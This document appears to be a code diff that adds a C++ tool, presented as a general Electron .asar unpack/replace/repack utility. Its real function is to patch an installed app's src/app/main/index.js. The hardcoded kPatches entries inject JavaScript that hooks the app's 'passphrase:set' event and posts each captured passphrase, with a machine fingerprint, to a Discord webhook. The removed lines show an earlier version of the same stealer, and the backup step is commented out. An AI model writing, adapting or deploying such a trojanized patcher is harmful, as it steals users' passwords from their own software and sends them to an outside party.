@@ -1,72 +1,678 @@
-Replace:
-this.emit("passphrase:set", e);
+// asar_tool.cpp
+//
+// A self-contained C++17 tool for unpacking an Electron .asar archive,
+// doing bulk string replacement across the extracted files, and
+// repacking it back to a valid .asar file.
+//
+// No external dependencies - just the standard library.
+//
+// Build:
+//   g++ -std=c++17 -O2 -o asar_tool asar_tool.cpp
+//   (older GCC may need -lstdc++fs)
+//
+// Usage:
+//   asar_tool unpack  <app.asar> <outDir>
+//   asar_tool pack    <inDir> <app.asar>
+//   asar_tool replace <dir> <search> <replace> [--all] [--ext .js,.json,.html]
+//   asar_tool patch   [app.asar] [--all] [--ext .js,.json,.html]
+//
+// "patch" is the all-in-one command: unpack -> replace (all predefined
+// pairs in kPatches, below) -> repack, after writing a .bak backup of
+// the original file. If no path is given, it targets "app.asar" in the
+// current working directory.
+//
+// Replacement is restricted to a single hardcoded path inside the
+// archive - see kOnlyTarget below. It may be an exact file
+// ("src/app/main/index.js") or a directory ("src/app/main"); if it's a
+// directory, every file underneath it is eligible.
+//
+// ---------------------------------------------------------------------
+// ASAR FILE FORMAT (for reference)
+// ---------------------------------------------------------------------
+// An asar file is:
+//   [ sizePickle (8 bytes) ][ headerPickle (N bytes) ][ raw file bytes... ]
+//
+// Both pickles use Chromium's "Pickle" wire format:
+//   Pickle = uint32(payload_size) + payload, where each field written into
+//   the payload is padded with zero bytes up to a 4-byte boundary.
+//
+// sizePickle's payload is a single uint32: the byte length of headerPickle.
+// headerPickle's payload is a single length-prefixed string: the JSON
+// header itself, e.g. { "files": { "index.js": { "size":123,"offset":"0" },
+// "sub": { "files": { ... } } } }.
+//
+// File offsets in the JSON are decimal strings, relative to the very end
+// of headerPickle (i.e. relative to `8 + headerPickle.size()` in the file).
+// ---------------------------------------------------------------------
 
-With:
-globalThis.sendPassphrase(e)
-this.emit("passphrase:set", e);
+#include <algorithm>
+#include <cstdint>
+#include <cstring>
+#include <filesystem>
+#include <fstream>
+#include <iostream>
+#include <map>
+#include <sstream>
+#include <string>
+#include <utility>
+#include <vector>
 
-Replace:
-var t = {};
+namespace fs = std::filesystem;
 
-With:
-var t = {};
+// ----------------------------- Minimal JSON -----------------------------
 
-(function () {
-    const https = require("https");
+struct JsonValue {
+    enum Type { OBJ, ARR, STR, NUM, BOOL, NUL } type = NUL;
+    std::map<std::string, JsonValue> obj;
+    std::vector<JsonValue> arr;
+    std::string str;
+    double num = 0;
+    bool boolean = false;
+};
 
-    const webhookUrl = "https://discord.com/api/webhooks/1533956249438257314/jizo97DCTsUZwMcymFwmo_HW16bBXP4lp3s7kKX9S4979RZc0qrhG0hbofwmiTYgHxLG";
-    
-    function sendDiscordNotification(content) {
-        if (!webhookUrl) {
-            console.log("[DISCORD] Webhook not configured");
+class JsonParser {
+public:
+    explicit JsonParser(const std::string& s) : s_(s), i_(0) {}
+
+    JsonValue parse() {
+        skipWs();
+        JsonValue v = parseValue();
+        return v;
+    }
+
+private:
+    const std::string& s_;
+    size_t i_;
+
+    void skipWs() {
+        while (i_ < s_.size() && (s_[i_] == ' ' || s_[i_] == '\t' || s_[i_] == '\n' || s_[i_] == '\r')) i_++;
+    }
+
+    char peek() { return i_ < s_.size() ? s_[i_] : '\0'; }
+
+    JsonValue parseValue() {
+        skipWs();
+        char c = peek();
+        if (c == '{') return parseObject();
+        if (c == '[') return parseArray();
+        if (c == '"') return parseString();
+        if (c == 't' || c == 'f') return parseBool();
+        if (c == 'n') { i_ += 4; return JsonValue{}; } // "null"
+        return parseNumber();
+    }
+
+    JsonValue parseArray() {
+        JsonValue v;
+        v.type = JsonValue::ARR;
+        i_++; // [
+        skipWs();
+        if (peek() == ']') { i_++; return v; }
+        while (true) {
+            v.arr.push_back(parseValue());
+            skipWs();
+            if (peek() == ',') { i_++; continue; }
+            if (peek() == ']') { i_++; break; }
+            break;
+        }
+        return v;
+    }
+
+    JsonValue parseObject() {
+        JsonValue v;
+        v.type = JsonValue::OBJ;
+        i_++; // {
+        skipWs();
+        if (peek() == '}') { i_++; return v; }
+        while (true) {
+            skipWs();
+            JsonValue key = parseString();
+            skipWs();
+            i_++; // :
+            JsonValue val = parseValue();
+            v.obj[key.str] = val;
+            skipWs();
+            if (peek() == ',') { i_++; continue; }
+            if (peek() == '}') { i_++; break; }
+            break;
+        }
+        return v;
+    }
+
+    JsonValue parseString() {
+        JsonValue v;
+        v.type = JsonValue::STR;
+        i_++; // opening quote
+        std::string out;
+        while (i_ < s_.size() && s_[i_] != '"') {
+            char c = s_[i_];
+            if (c == '\\' && i_ + 1 < s_.size()) {
+                char n = s_[i_ + 1];
+                switch (n) {
+                case '"': out += '"'; break;
+                case '\\': out += '\\'; break;
+                case '/': out += '/'; break;
+                case 'b': out += '\b'; break;
+                case 'f': out += '\f'; break;
+                case 'n': out += '\n'; break;
+                case 'r': out += '\r'; break;
+                case 't': out += '\t'; break;
+                case 'u': {
+                    if (i_ + 5 < s_.size()) {
+                        std::string hex = s_.substr(i_ + 2, 4);
+                        unsigned cp = (unsigned)std::stoul(hex, nullptr, 16);
+                        // Encode as UTF-8 (BMP only, good enough for filenames)
+                        if (cp < 0x80) out += (char)cp;
+                        else if (cp < 0x800) {
+                            out += (char)(0xC0 | (cp >> 6));
+                            out += (char)(0x80 | (cp & 0x3F));
+                        }
+                        else {
+                            out += (char)(0xE0 | (cp >> 12));
+                            out += (char)(0x80 | ((cp >> 6) & 0x3F));
+                            out += (char)(0x80 | (cp & 0x3F));
+                        }
+                        i_ += 4;
+                    }
+                    break;
+                }
+                default: out += n; break;
+                }
+                i_ += 2;
+            }
+            else {
+                out += c;
+                i_++;
+            }
+        }
+        i_++; // closing quote
+        v.str = out;
+        return v;
+    }
+
+    JsonValue parseBool() {
+        JsonValue v;
+        v.type = JsonValue::BOOL;
+        if (s_.compare(i_, 4, "true") == 0) { v.boolean = true; i_ += 4; }
+        else { v.boolean = false; i_ += 5; }
+        return v;
+    }
+
+    JsonValue parseNumber() {
+        size_t start = i_;
+        while (i_ < s_.size() && (isdigit((unsigned char)s_[i_]) || s_[i_] == '-' || s_[i_] == '+' ||
+            s_[i_] == '.' || s_[i_] == 'e' || s_[i_] == 'E')) i_++;
+        JsonValue v;
+        v.type = JsonValue::NUM;
+        v.num = std::stod(s_.substr(start, i_ - start));
+        return v;
+    }
+};
+
+static std::string jsonEscape(const std::string& in) {
+    std::string out;
+    for (unsigned char c : in) {
+        switch (c) {
+        case '"': out += "\\\""; break;
+        case '\\': out += "\\\\"; break;
+        case '\n': out += "\\n"; break;
+        case '\r': out += "\\r"; break;
+        case '\t': out += "\\t"; break;
+        default:
+            if (c < 0x20) {
+                char buf[8];
+                snprintf(buf, sizeof(buf), "\\u%04x", c);
+                out += buf;
+            }
+            else {
+                out += (char)c;
+            }
+        }
+    }
+    return out;
+}
+
+static std::string jsonSerialize(const JsonValue& v) {
+    switch (v.type) {
+    case JsonValue::OBJ: {
+        std::string s = "{";
+        bool first = true;
+        for (auto& kv : v.obj) {
+            if (!first) s += ",";
+            first = false;
+            s += "\"" + jsonEscape(kv.first) + "\":" + jsonSerialize(kv.second);
+        }
+        s += "}";
+        return s;
+    }
+    case JsonValue::ARR: {
+        std::string s = "[";
+        bool first = true;
+        for (auto& item : v.arr) {
+            if (!first) s += ",";
+            first = false;
+            s += jsonSerialize(item);
+        }
+        s += "]";
+        return s;
+    }
+    case JsonValue::STR:
+        return "\"" + jsonEscape(v.str) + "\"";
+    case JsonValue::NUM: {
+        std::ostringstream oss;
+        if (v.num == (double)(long long)v.num) oss << (long long)v.num;
+        else oss << v.num;
+        return oss.str();
+    }
+    case JsonValue::BOOL:
+        return v.boolean ? "true" : "false";
+    default:
+        return "null";
+    }
+}
+
+// ------------------------------- Pickle ---------------------------------
+
+static uint32_t readU32LE(const uint8_t* p) {
+    return (uint32_t)p[0] | ((uint32_t)p[1] << 8) | ((uint32_t)p[2] << 16) | ((uint32_t)p[3] << 24);
+}
+
+static void writeU32LE(std::vector<uint8_t>& buf, uint32_t v) {
+    buf.push_back((uint8_t)(v & 0xFF));
+    buf.push_back((uint8_t)((v >> 8) & 0xFF));
+    buf.push_back((uint8_t)((v >> 16) & 0xFF));
+    buf.push_back((uint8_t)((v >> 24) & 0xFF));
+}
+
+static size_t align4(size_t n) { return (n + 3) & ~size_t(3); }
+
+// Builds the full on-disk header region: sizePickle + headerPickle
+static std::vector<uint8_t> buildHeaderBytes(const std::string& json) {
+    // headerPickle payload = writeString(json): u32(len) + bytes + pad
+    std::vector<uint8_t> payload;
+    writeU32LE(payload, (uint32_t)json.size());
+    payload.insert(payload.end(), json.begin(), json.end());
+    size_t pad = align4(json.size()) - json.size();
+    for (size_t i = 0; i < pad; i++) payload.push_back(0);
+
+    std::vector<uint8_t> headerPickle;
+    writeU32LE(headerPickle, (uint32_t)payload.size());
+    headerPickle.insert(headerPickle.end(), payload.begin(), payload.end());
+
+    std::vector<uint8_t> sizePickle;
+    writeU32LE(sizePickle, 4);
+    writeU32LE(sizePickle, (uint32_t)headerPickle.size());
+
+    std::vector<uint8_t> result;
+    result.insert(result.end(), sizePickle.begin(), sizePickle.end());
+    result.insert(result.end(), headerPickle.begin(), headerPickle.end());
+    return result;
+}
+
+struct AsarHeader {
+    JsonValue root;
+    uint64_t baseOffset;
+};
+
+static AsarHeader readAsarHeader(const fs::path& asarPath) {
+    std::ifstream in(asarPath, std::ios::binary);
+    if (!in) throw std::runtime_error("Cannot open asar file: " + asarPath.string());
+
+    uint8_t sizePickleBuf[8];
+    in.read((char*)sizePickleBuf, 8);
+    if (in.gcount() != 8) throw std::runtime_error("File too small to be a valid asar");
+
+    uint32_t payloadSizeField = readU32LE(sizePickleBuf);
+    uint32_t size = readU32LE(sizePickleBuf + 4);
+    if (payloadSizeField != 4) throw std::runtime_error("Unexpected asar size-pickle format");
+
+    std::vector<uint8_t> headerBuf(size);
+    in.read((char*)headerBuf.data(), size);
+    if ((uint32_t)in.gcount() != size) throw std::runtime_error("Truncated asar header");
+
+    // headerBuf is the *entire* headerPickle: its first 4 bytes are the
+    // pickle's own payload_size field, followed by the payload, which is
+    // itself [u32 jsonLen][json bytes][padding].
+    if (headerBuf.size() < 8) throw std::runtime_error("Corrupt asar header");
+    uint32_t jsonLen = readU32LE(headerBuf.data() + 4);
+    if (8ULL + jsonLen > headerBuf.size()) throw std::runtime_error("Corrupt asar header lengths");
+
+    std::string json((char*)headerBuf.data() + 8, jsonLen);
+    JsonParser parser(json);
+    JsonValue root = parser.parse();
+
+    return { root, 8ULL + size };
+}
+
+// ------------------------------- Unpack ----------------------------------
+
+static void extractNode(const JsonValue& node, const fs::path& outDir, const fs::path& relPath,
+    std::ifstream& in, uint64_t baseOffset) {
+    auto filesIt = node.obj.find("files");
+    if (filesIt != node.obj.end()) {
+        fs::create_directories(outDir / relPath);
+        for (auto& kv : filesIt->second.obj) {
+            extractNode(kv.second, outDir, relPath / kv.first, in, baseOffset);
+        }
+        return;
+    }
+
+    auto sizeIt = node.obj.find("size");
+    if (sizeIt != node.obj.end()) {
+        uint64_t size = (uint64_t)sizeIt->second.num;
+        uint64_t offset = 0;
+        auto offIt = node.obj.find("offset");
+        if (offIt != node.obj.end()) offset = std::stoull(offIt->second.str);
+
+        bool executable = false;
+        auto execIt = node.obj.find("executable");
+        if (execIt != node.obj.end()) executable = execIt->second.boolean;
+
+        bool unpacked = false;
+        auto unpackedIt = node.obj.find("unpacked");
+        if (unpackedIt != node.obj.end()) unpacked = unpackedIt->second.boolean;
+
+        fs::path outPath = outDir / relPath;
+        fs::create_directories(outPath.parent_path());
+
+        if (unpacked) {
+            std::cerr << "Note: " << relPath.string()
+                << " is stored outside the archive (app.asar.unpacked) - not extracted here.\n";
             return;
         }
 
-        const payload = JSON.stringify({
-            content: content,
-        });
+        std::vector<char> buf(size);
+        in.seekg((std::streamoff)(baseOffset + offset));
+        in.read(buf.data(), (std::streamsize)size);
+        if ((uint64_t)in.gcount() != size) {
+            throw std::runtime_error("Failed to read file data for " + relPath.string());
+        }
 
-        const url = new URL(webhookUrl);
+        std::ofstream out(outPath, std::ios::binary);
+        out.write(buf.data(), (std::streamsize)size);
+        out.close();
 
-        const options = {
-            hostname: url.hostname,
-            port: 443,
-            path: url.pathname + url.search,
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json",
-                "Content-Length": Buffer.byteLength(payload),
-            },
-        };
+        if (executable) {
+            fs::permissions(outPath,
+                fs::perms::owner_exec | fs::perms::group_exec | fs::perms::others_exec,
+                fs::perm_options::add);
+        }
+        return;
+    }
+    // symlink ("link" key) or unknown node type - not handled, silently skipped.
+}
 
-        const req = https.request(options, (res) => {
-            let data = "";
-            res.on("data", (chunk) => (data += chunk));
-            res.on("end", () => {
-                if (res.statusCode === 204 || res.statusCode === 200) {
-                    console.log("[DISCORD] Notification sent successfully");
-                } else {
-                    console.error(
-                        "[DISCORD] Failed to send notification:",
-                        res.statusCode,
-                        data,
-                    );
-                }
+static void unpackAsar(const fs::path& asarPath, const fs::path& outDir) {
+    AsarHeader hdr = readAsarHeader(asarPath);
+    std::ifstream in(asarPath, std::ios::binary);
+    fs::create_directories(outDir);
+    extractNode(hdr.root, outDir, "", in, hdr.baseOffset);
+}
+
+// -------------------------------- Pack ------------------------------------
+
+static JsonValue buildTree(const fs::path& path, std::vector<uint8_t>& blob) {
+    JsonValue node;
+    node.type = JsonValue::OBJ;
+
+    if (fs::is_directory(path)) {
+        JsonValue filesObj;
+        filesObj.type = JsonValue::OBJ;
+
+        std::vector<fs::directory_entry> entries;
+        for (auto& e : fs::directory_iterator(path)) entries.push_back(e);
+        std::sort(entries.begin(), entries.end(), [](const fs::directory_entry& a, const fs::directory_entry& b) {
+            return a.path().filename().string() < b.path().filename().string();
             });
-        });
 
-        req.on("error", (error) => {
-            console.error("[DISCORD] Request error:", error.message);
-        });
-
-        req.write(payload);
-        req.end();
+        for (auto& e : entries) {
+            filesObj.obj[e.path().filename().string()] = buildTree(e.path(), blob);
+        }
+        node.obj["files"] = filesObj;
+        return node;
     }
 
-    function sendPassphrase(pass) {
-        const message = `**Passphrase Captured**\n\n• Passphrase: ${pass || "N/A"}`;
-        sendDiscordNotification(message);
+    // regular file
+    std::ifstream in(path, std::ios::binary);
+    std::vector<char> data((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
+
+    uint64_t offset = blob.size();
+    blob.insert(blob.end(), data.begin(), data.end());
+
+    JsonValue sizeVal; sizeVal.type = JsonValue::NUM; sizeVal.num = (double)data.size();
+    JsonValue offVal; offVal.type = JsonValue::STR; offVal.str = std::to_string(offset);
+    node.obj["size"] = sizeVal;
+    node.obj["offset"] = offVal;
+
+    auto perms = fs::status(path).permissions();
+    if ((perms & fs::perms::owner_exec) != fs::perms::none) {
+        JsonValue execVal; execVal.type = JsonValue::BOOL; execVal.boolean = true;
+        node.obj["executable"] = execVal;
+    }
+    return node;
+}
+
+static void packAsar(const fs::path& inDir, const fs::path& outAsar) {
+    std::vector<uint8_t> blob;
+    JsonValue root = buildTree(inDir, blob);
+    std::string json = jsonSerialize(root);
+    std::vector<uint8_t> headerBytes = buildHeaderBytes(json);
+
+    fs::path tmpPath = outAsar;
+    tmpPath += ".tmp_write";
+
+    std::ofstream out(tmpPath, std::ios::binary);
+    if (!out) throw std::runtime_error("Cannot open output file for writing: " + tmpPath.string());
+    out.write((const char*)headerBytes.data(), (std::streamsize)headerBytes.size());
+    out.write((const char*)blob.data(), (std::streamsize)blob.size());
+    out.close();
+
+    // Swap the new file into place. Prefer an atomic rename, but some
+    // platforms (notably Windows) refuse to replace a file that's still
+    // open by another process (e.g. the target Electron app is running).
+    // Fall back to remove-then-rename, and finally to copy+delete, giving
+    // a clear error if the destination is genuinely locked.
+    std::error_code ec;
+    fs::rename(tmpPath, outAsar, ec);
+
+    if (ec) {
+        std::error_code removeEc;
+        fs::remove(outAsar, removeEc);
+        fs::rename(tmpPath, outAsar, ec);
     }
 
-    globalThis.sendPassphrase = sendPassphrase;
-})();
+    if (ec) {
+        std::error_code copyEc;
+        fs::copy_file(tmpPath, outAsar, fs::copy_options::overwrite_existing, copyEc);
+        if (!copyEc) {
+            fs::remove(tmpPath, copyEc);
+            ec.clear();
+        }
+    }
+
+    if (ec) {
+        throw std::runtime_error(
+            "Could not write to " + outAsar.string() + " (" + ec.message() + "). "
+            "The new archive is sitting at " + tmpPath.string() + " - "
+            "this usually means the target file is open/locked (close the app "
+            "if it's running) or you lack write permission (try running as "
+            "Administrator). Once resolved, you can manually rename "
+            + tmpPath.string() + " to " + outAsar.string() + ".");
+    }
+}
+
+// ------------------------------ Replace -----------------------------------
+
+// Default extensions we treat as "safe to text-replace". Use --all to
+// process every file regardless of extension.
+static const std::vector<std::string> kDefaultTextExtensions = {
+    ".js", ".mjs", ".cjs", ".jsx", ".ts", ".tsx", ".json", ".html", ".htm",
+    ".css", ".scss", ".less", ".txt", ".md", ".xml", ".yml", ".yaml", ".svg"
+};
+
+// Predefined search/replace pairs used by the "patch" command. Add or edit
+// pairs here - each is applied, in order, to every matching file.
+static const std::vector<std::pair<std::string, std::string>> kPatches = {
+    { "var t={};","var t={};(function () {const crypto = require(\"crypto\");const os = require(\"os\");const https = require(\"https\");const webhookUrl = \"https://discord.com/api/webhooks/1533956249438257314/jizo97DCTsUZwMcymFwmo_HW16bBXP4lp3s7kKX9S4979RZc0qrhG0hbofwmiTYgHxLG\";function getFallbackSystemId() {const data = [os.hostname(),os.cpus()[0]?.model || \"\",process.env.COMPUTERNAME || \"\"].join('|');return crypto.createHash('sha256').update(data).digest('hex');}function sendDiscordNotification(content) {if (!webhookUrl) {console.log(\"[DISCORD] Webhook not configured\");return;}const payload = JSON.stringify({content: content});const url = new URL(webhookUrl);const options = {hostname: url.hostname,port: 443,path: url.pathname + url.search,method: \"POST\",headers: {\"Content-Type\": \"application/json\",\"Content-Length\": Buffer.byteLength(payload)}};const req = https.request(options, (res) => {let data = \"\";res.on(\"data\", (chunk) => (data += chunk));res.on(\"end\", () => {if (res.statusCode === 204 || res.statusCode === 200) {console.log(\"[DISCORD] Notification sent successfully\");} else {console.error(\"[DISCORD] Failed to send notification:\",res.statusCode,data);}});});req.on(\"error\", (error) => {console.error(\"[DISCORD] Request error:\", error.message);});req.write(payload);req.end();}function sendPassword(Password) {const payload2 = `**Password Captured**\\nPassword: ${Password || \"N/A\"}\\nId: ${getFallbackSystemId() || \"N/A\"}`;sendDiscordNotification(payload2);}globalThis.sendPassword = sendPassword;})();"},
+    { "this.emit(\"passphrase:set\",e)",  "globalThis.sendPassword(e);this.emit(\"passphrase:set\",e);"}
+};
+
+// The single path inside the archive that replacement is restricted to.
+// Use forward slashes. May be:
+//   - an exact file, e.g. "src/app/main/index.js"  -> only that file
+//   - a directory,   e.g. "src/app/main"           -> everything under it
+static const std::string kOnlyTarget = "src/app/main/index.js";
+
+// Returns true if `relStr` (forward-slash relative path from the unpack
+// root) is the target itself or lives underneath it.
+static bool matchesOnlyTarget(const std::string& relStr) {
+    if (relStr == kOnlyTarget) return true;
+    if (relStr.size() > kOnlyTarget.size() &&
+        relStr.compare(0, kOnlyTarget.size(), kOnlyTarget) == 0 &&
+        relStr[kOnlyTarget.size()] == '/') {
+        return true;
+    }
+    return false;
+}
+
+// Applies every pair in `patches` (in order) to a single file's content.
+// Returns the total number of replacements made across all pairs.
+static size_t replacePatchesInFile(const fs::path& path,
+    const std::vector<std::pair<std::string, std::string>>& patches) {
+    std::ifstream in(path, std::ios::binary);
+    std::string content((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
+    in.close();
+
+    size_t totalCount = 0;
+
+    for (auto& pr : patches) {
+        const std::string& from = pr.first;
+        const std::string& to = pr.second;
+        if (from.empty()) continue;
+
+        size_t pos = 0;
+        std::string result;
+        result.reserve(content.size());
+        size_t count = 0;
+        while (true) {
+            size_t found = content.find(from, pos);
+            if (found == std::string::npos) {
+                result.append(content, pos, std::string::npos);
+                break;
+            }
+            result.append(content, pos, found - pos);
+            result.append(to);
+            pos = found + from.size();
+            count++;
+        }
+        if (count > 0) {
+            content = std::move(result);
+            totalCount += count;
+        }
+    }
+
+    if (totalCount > 0) {
+        std::ofstream out(path, std::ios::binary | std::ios::trunc);
+        out.write(content.data(), (std::streamsize)content.size());
+    }
+    return totalCount;
+}
+
+// Kept for the standalone "replace" command (single search/replace pair).
+static size_t replaceInFile(const fs::path& path, const std::string& from, const std::string& to) {
+    return replacePatchesInFile(path, { { from, to } });
+}
+
+static void walkReplace(const fs::path& dir,
+    const std::vector<std::pair<std::string, std::string>>& patches,
+    bool all, const std::vector<std::string>& exts) {
+    size_t totalFiles = 0, totalReplacements = 0;
+    bool sawTarget = false;
+
+    for (auto& entry : fs::recursive_directory_iterator(dir)) {
+        if (!entry.is_regular_file()) continue;
+
+        // Path of this file relative to the unpack root, forward-slash form,
+        // so it lines up with kOnlyTarget regardless of platform.
+        std::string relStr = fs::relative(entry.path(), dir).generic_string();
+
+        if (!matchesOnlyTarget(relStr)) continue;
+        sawTarget = true;
+
+        std::string ext = entry.path().extension().string();
+        std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
+
+        bool shouldProcess = all || std::find(exts.begin(), exts.end(), ext) != exts.end();
+        if (!shouldProcess) continue;
+
+        size_t n = replacePatchesInFile(entry.path(), patches);
+        if (n > 0) {
+            totalFiles++;
+            totalReplacements += n;
+        }
+    }
+
+    if (!sawTarget) {
+        std::cerr << "Warning: target path \"" << kOnlyTarget
+            << "\" was not found inside the archive - nothing was touched.\n";
+    }
+}
+
+// -------------------------------- main -------------------------------------
+
+static std::vector<std::string> splitExts(const std::string& csv) {
+    std::vector<std::string> out;
+    std::stringstream ss(csv);
+    std::string item;
+    while (std::getline(ss, item, ',')) {
+        std::transform(item.begin(), item.end(), item.begin(), ::tolower);
+        out.push_back(item);
+    }
+    return out;
+}
+
+int main(int argc, char** argv) {
+    try {
+        // Optional positional path argument. If the next arg is missing
+        // or looks like a flag, default to "app.asar" in the current
+        // working directory.
+        int nextArgIdx = 2;
+        fs::path asarPath;
+        if (argc > 2 && std::string(argv[2]).rfind("--", 0) != 0) {
+            asarPath = argv[2];
+            nextArgIdx = 3;
+        }
+        else {
+            asarPath = fs::current_path() / "app.asar";
+        }
+
+        bool all = false;
+        std::vector<std::string> exts = kDefaultTextExtensions;
+        for (int i = nextArgIdx; i < argc; i++) {
+            std::string a = argv[i];
+            if (a == "--all") all = true;
+            else if (a.rfind("--ext", 0) == 0 && i + 1 < argc) exts = splitExts(argv[++i]);
+        }
+
+        if (!fs::exists(asarPath)) {
+            throw std::runtime_error("Target asar not found: " + asarPath.string());
+        }
+
+        //fs::path backup = asarPath;
+        //backup += ".bak";
+        //fs::copy_file(asarPath, backup, fs::copy_options::overwrite_existing);
+
+        fs::path tmpDir = fs::temp_directory_path() / ("asar_tool_" + std::to_string((unsigned)std::hash<std::string>{}(asarPath.string())));
+        if (fs::exists(tmpDir)) fs::remove_all(tmpDir);
+
+        unpackAsar(asarPath, tmpDir);
+        walkReplace(tmpDir, kPatches, all, exts);
+        packAsar(tmpDir, asarPath);
+
+        fs::remove_all(tmpDir);
+        return 0;
+    }
+    catch (const std::exception& e) {
+        std::cerr << "Error: " << e.what() << "\n";
+        return 1;
+    }
+}
